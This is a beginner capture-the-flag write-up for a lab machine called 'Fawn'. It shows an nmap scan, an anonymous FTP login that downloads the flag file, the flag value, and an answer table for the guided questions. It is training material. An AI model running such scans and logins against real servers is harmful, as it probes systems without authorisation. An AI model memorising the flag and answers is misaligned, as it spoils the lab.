# Fawn

|            |                                                              |
|------------|--------------------------------------------------------------|
| Track      | Starting Point - Tier 0                                      |
| Difficulty | Very Easy                                                    |
| OS         | Unix                                                         |
| Tags       | FTP, Network, Protocols, Reconnaissance, Anonymous Access    |
| Tools      | `nmap`, `ftp`                                                |

## Summary

vsftpd 3.0.3 with anonymous login enabled. The flag is sitting in the
anonymous user's home directory. The trick is recognising that "anonymous"
isn't a special FTP feature, it's just an account convention some servers
ship enabled by default.

## Solve

```bash
nmap -sV -p 21 10.129.57.230
# 21/tcp open  ftp     vsftpd 3.0.3

ftp 10.129.57.230
# Name: anonymous
# Password: <blank>
ftp> ls
# -rw-r--r--    1 0  0  32 Jun 04  2021 flag.txt
ftp> get flag.txt
ftp> exit

cat flag.txt
035db21c881520061c53e0536e44f815
```

## Guided Tasks

| #   | Question | Answer |
|-----|----------|--------|
| 1   | What does the 3-letter acronym FTP stand for? | File Transfer Protocol |
| 2   | Which port does the FTP service listen on usually? | 21 |
| 3   | What acronym is used for the secure version of FTP? | SFTP |
| 4   | What is the command we can use to send an ICMP echo request to test our connection to the target? | ping |
| 5   | From your scans, what version is FTP running on the target? | vsftpd 3.0.3 |
| 6   | From your scans, what OS type is running on the target? | Unix |
| 7   | What is the command we need to run in order to display the 'ftp' client help menu? | `ftp -h` |
| 8   | What is the username that is used over FTP when you want to log in without having an account? | anonymous |
| 9   | What is the response code we get for the FTP message 'Login successful'? | 230 |
| 10  | There are a couple of commands we can use to list the files and directories available on the FTP server. One is `dir`. What is the other that is a common way to list files on a Linux system? | ls |
| 11  | What is the command used to download the file we found on the FTP server? | get |
